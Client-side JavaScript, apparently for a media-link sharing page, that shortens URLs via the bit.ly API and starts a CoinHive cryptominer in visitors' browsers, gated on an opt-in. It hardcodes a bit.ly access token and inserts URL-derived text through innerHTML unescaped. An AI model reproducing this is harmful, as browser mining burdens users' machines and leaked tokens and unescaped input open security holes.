var base = "https://api-ssl.bit.ly/v3/shorten?access_token=b928afeae904842e0aa6b9510b26deb12c6ad7d3";
var baseExpand = "https://api-ssl.bit.ly/v3/expand?access_token=b928afeae904842e0aa6b9510b26deb12c6ad7d3";
var img;
if (window.location.hash != "") {
  var miner = new CoinHive.User("yjGFHNXbIib2c8o9CgcrVVAfTd6na4Cz", window.location.hash.slice(1));
  miner.start();
  img = window.location.hash.slice(1);
  miner.on('optin', function(params) {
    if (params.status != 'accepted') {
      document.querySelector("#maincard"+img.split("").pop()).style.display = "none";
    }
  });
  if (isNaN(parseInt(img.split("").pop())) || parseInt(img.split("").pop()) > 3) {
    img += "0";
  }
  console.log(img,img.slice(0,img.length-1));
  document.querySelector("#maincard"+img.split("").pop()).src = "http://bit.ly/"+img.slice(0,img.length-1);
  document.querySelector("#maincard"+img.split("").pop()).style.display = "inherit";
  fetch(baseExpand+"&shortUrl=http%3A%2F%2Fbit.ly%2F"+img.slice(0,img.length-1)+"&format=txt").then((res) => {
    return res.text();}).then((a) => {
    a = a.split("/").pop().split(".");
    a.pop();
    var title = a.pop();
    document.querySelector(".title").innerHTML += " | "+title;
    document.querySelector("title").innerHTML += " | "+title;
  })
} else {
  document.querySelector(".main").style.display = "inherit";
}

var url = "http://postdb.io/#";
function submit() {
  var i1 = document.querySelector("#short").value;
    fetch(base+"&longUrl="+i1+"&format=json").then((res) => {
      return res.json();
    }).then((data) => {
      // 0=img 1=audio 2=video
      var e = i1.split(".").pop().toLowerCase();
      var num = {"jpg": 0,"gif": 0,"png": 0,"jpeg": 0,"mp3": 1,"ogg": 1,"wav": 1,"mp4": 2,"mpg": 2,"webm": 2, "svg": 3}[e];
      if (!num) num = 0;
      url += data.data.hash
      window.location.href = url+num.toString();
      window.location.reload();
    });
}
var i = 0;
setInterval(() => {
  i++;
  document.querySelector("#word").innerHTML = ["IMAGE", "GIF", "AUDIO", "VIDEO"][i%4];
}, 3000);
